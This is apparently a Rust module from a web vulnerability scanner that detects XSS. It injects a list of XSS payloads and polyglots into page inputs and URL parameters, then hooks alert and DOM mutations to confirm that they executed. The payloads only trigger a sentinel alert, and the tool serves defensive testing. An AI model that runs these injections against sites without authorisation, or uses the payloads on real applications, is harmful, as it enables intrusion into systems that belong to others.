use anyhow::Result;
use obscura_browser::Page;
use tracing::info;

use crate::core::scanner::{Finding, FindingCategory, Severity};

static XSS_PAYLOADS: &[&str] = &[
    "<script>alert('XSS_SENTINEL')</script>",
    "<img src=x onerror=alert('XSS_SENTINEL')>",
    "'\"><script>alert('XSS_SENTINEL')</script>",
    "<svg onload=alert('XSS_SENTINEL')>",
];

static XSS_POLYGLOTS: &[&str] = &[
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS_SENTINEL') )//",
    "'\"><img/src/onerror=alert('XSS_SENTINEL')>",
    "${alert('XSS_SENTINEL')}",
    "<svg><animate onbegin=alert('XSS_SENTINEL') attributeName=x dur=1s>",
    "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;img src=x onerror=alert('XSS_SENTINEL')&gt;\">",
    "<img src=x onerror=alert`XSS_SENTINEL`>",
    "<body onpageshow=alert('XSS_SENTINEL')>",
    "<details open ontoggle=alert('XSS_SENTINEL')>",
];

const INPUT_SELECTOR: &str = "input[type='text'], input:not([type]), textarea, input[type='search'], input[type='url'], input[type='email'], input[type='tel'], [contenteditable='true']";

pub struct XssDetector;

impl XssDetector {
    pub fn new() -> Self {
        Self
    }

    pub async fn scan(&self, page: &mut Page, target: &str) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();

        let all_payloads: Vec<&str> = XSS_PAYLOADS.iter()
            .chain(XSS_POLYGLOTS.iter())
            .copied()
            .collect();

        for (idx, payload) in all_payloads.iter().enumerate() {
            // Re-navigate to the original target before each payload attempt.
            // A previous iteration's form.submit() may have navigated the page away,
            // making subsequent evaluations run against the wrong document.
            if idx > 0 && page.navigate(target).await.is_err() {
                continue;
            }
            Self::setup_xss_hooks(page);

            let payload_json = serde_json::to_string(payload).unwrap_or_default();
            let selector_json = serde_json::to_string(INPUT_SELECTOR).unwrap_or_default();
            let js = format!(
                r#"(function() {{
                    var inputs = document.querySelectorAll({sel});
                    if (!inputs || inputs.length === 0) {{ return 0; }}
                    for (var i = 0; i < inputs.length; i++) {{
                        inputs[i].value = {p};
                        var form = inputs[i].form;
                        if (form) {{ try {{ form.submit(); }} catch(e) {{}} }}
                    }}
                    return inputs.length;
                }})()"#,
                sel = selector_json,
                p = payload_json,
            );

            let injected = page.evaluate(&js).as_i64().unwrap_or(0);
            if injected > 0 {
                tokio::time::sleep(tokio::time::Duration::from_millis(250)).await;
                if Self::check_xss_triggered(page) {
                    info!("[XSS] DOM XSS confirmed: {}", payload);
                    let is_polyglot = XSS_POLYGLOTS.contains(payload);
                    let title = if is_polyglot {
                        "DOM-based XSS (Polyglot Payload)"
                    } else {
                        "DOM-based XSS Detected"
                    };
                    let description = if is_polyglot {
                        format!("XSS confirmed via polyglot payload: {}", payload)
                    } else {
                        format!("XSS confirmed via JS alert(). Payload: {}", payload)
                    };
                    let mut f = Finding::new(
                        Severity::High,
                        FindingCategory::Xss,
                        title,
                        description,
                        target.to_string(),
                    );
                    f.evidence = Some(payload.to_string());
                    f.remediation = Some(
                        "Sanitize output; use textContent not innerHTML; apply CSP.".to_string(),
                    );
                    findings.push(f);
                    Self::reset_xss_state(page);
                }
            }
        }

        for payload in &all_payloads {
            let encoded = percent_encode(payload);
            let test_url = if target.contains('?') {
                format!("{}&q={}", target, encoded)
            } else {
                format!("{}?q={}", target, encoded)
            };

            if page.navigate(&test_url).await.is_ok() {
                Self::setup_xss_hooks(page);
                tokio::time::sleep(tokio::time::Duration::from_millis(300)).await;
                if Self::check_xss_triggered(page) {
                    info!("[XSS] Reflected XSS: {}", payload);
                    let mut f = Finding::new(
                        Severity::High,
                        FindingCategory::Xss,
                        "Reflected XSS (URL Parameter)",
                        format!("XSS via URL param. Payload: {}", payload),
                        test_url,
                    );
                    f.evidence = Some(payload.to_string());
                    findings.push(f);
                    break;
                }
            }
        }

        Ok(findings)
    }

    fn setup_xss_hooks(page: &mut Page) {
        page.evaluate(
            r#"
            window.__xss_triggered = false;
            window.__xss_payload = '';
            window.__xss_dom_mutation = false;
            window.alert = function(m) { window.__xss_triggered = true; window.__xss_payload = String(m); };
            window.prompt = function(m) { window.__xss_triggered = true; window.__xss_payload = String(m); return null; };
            window.confirm = function(m) { window.__xss_triggered = true; window.__xss_payload = String(m); return false; };
            (function() {
                try {
                    new MutationObserver(function(mutations) {
                        mutations.forEach(function(m) {
                            m.addedNodes.forEach(function(node) {
                                if (node.nodeName === 'SCRIPT' || (node.outerHTML && node.outerHTML.match(/on\w+\s*=/i))) {
                                    window.__xss_dom_mutation = true;
                                }
                            });
                        });
                    }).observe(document.body || document.documentElement, {childList: true, subtree: true});
                } catch(e) {}
            })();
            "#,
        );
    }

    fn check_xss_triggered(page: &mut Page) -> bool {
        let alert_triggered = page.evaluate("!!window.__xss_triggered")
            .as_bool()
            .unwrap_or(false);
        let dom_mutation = page.evaluate("!!window.__xss_dom_mutation")
            .as_bool()
            .unwrap_or(false);
        alert_triggered || dom_mutation
    }

    fn reset_xss_state(page: &mut Page) {
        page.evaluate(
            r#"
            window.__xss_triggered = false;
            window.__xss_payload = '';
            window.__xss_dom_mutation = false;
            window.alert = function(m) { window.__xss_triggered = true; window.__xss_payload = String(m); };
            "#,
        );
    }
}

fn percent_encode(s: &str) -> String {
    let mut out = String::new();
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char);
            }
            _ => {
                out.push_str(&format!("%{:02X}", b));
            }
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_percent_encode() {
        let enc = percent_encode("<script>");
        assert!(!enc.contains('<'));
        assert!(!enc.contains('>'));
        assert!(enc.contains('%'));
    }
}
